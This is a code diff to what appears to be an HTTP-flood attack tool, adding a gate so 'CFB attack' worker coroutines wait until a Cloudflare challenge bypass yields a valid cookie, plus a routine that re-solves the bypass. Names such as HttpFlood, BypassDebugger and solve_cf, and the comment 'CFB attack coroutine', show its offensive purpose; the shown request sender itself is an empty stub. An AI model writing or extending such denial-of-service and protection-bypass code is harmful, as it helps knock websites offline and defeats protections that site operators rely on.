@@ -73,6 +73,7 @@ from uuid import UUID, uuid4
 import traceback
 from src.core.debugger import BypassDebugger
 from src.core.proxy_guard import ProxyCircuitBreaker
+from src.core import state_manager as _sm
 
 import psutil
 import requests
@@ -2231,6 +2232,12 @@ class BrowserEngine:
                         if probe_success:
                             logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cached token is valid. Skipping solver.{bcolors.RESET}")
                             HttpFlood._active_solver = entry.get("solver_name", "Cache")
+                            try:
+                                import asyncio
+                                loop = asyncio.get_running_loop()
+                                loop.call_soon_threadsafe(_sm.bypass_ready_event.set)
+                            except RuntimeError:
+                                pass
                             return entry["cookie"], entry["ua"]
                         else:
                             logger.info(f"{bcolors.WARNING}[!] Headless Recon: Cached token expired or invalid. Solving again...{bcolors.RESET}")
@@ -2264,6 +2271,14 @@ class BrowserEngine:
                 logger.debug(f"[*] Saved cookie for {domain} to token_cache.json")
             except Exception as e:
                 logger.debug(f"[*] Cache write error: {e}")
+
+        if cookie:
+            try:
+                import asyncio
+                loop = asyncio.get_running_loop()
+                loop.call_soon_threadsafe(_sm.bypass_ready_event.set)
+            except RuntimeError:
+                pass
 
         return cookie, ua
 
@@ -6214,6 +6229,35 @@ async def main_async():
         logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
         import os
         os._exit(1)
+
+async def _cfb_send_request(target: str) -> None:
+    """Send a single CFB request."""
+    pass
+
+async def _cfb_worker_task(target: str, stop_event: asyncio.Event) -> None:
+    """CFB attack coroutine gated on bypass_ready_event."""
+    while not stop_event.is_set():
+        await _sm.bypass_ready_event.wait()  # ← GATE
+        try:
+            await _cfb_send_request(target)
+        except Exception as e:
+            logger.debug("[CFB Worker] %s", e)
+        await asyncio.sleep(0)
+
+async def _run_waterfall_bypass(target_url: str) -> str | None:
+    """Run the waterfall bypass Cascade and return the token."""
+    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, target_url)
+    return cookie
+
+async def _trigger_bypass_re_solve(target_url: str) -> None:
+    """Clear gate, run waterfall, re-open gate regardless of outcome."""
+    _sm.bypass_ready_event.clear()
+    try:
+        token = await _run_waterfall_bypass(target_url)
+        if token:
+            _sm.current_cf_token = token
+    finally:
+        _sm.bypass_ready_event.set()
 
 if __name__ == "__main__":
     with suppress(KeyboardInterrupt):
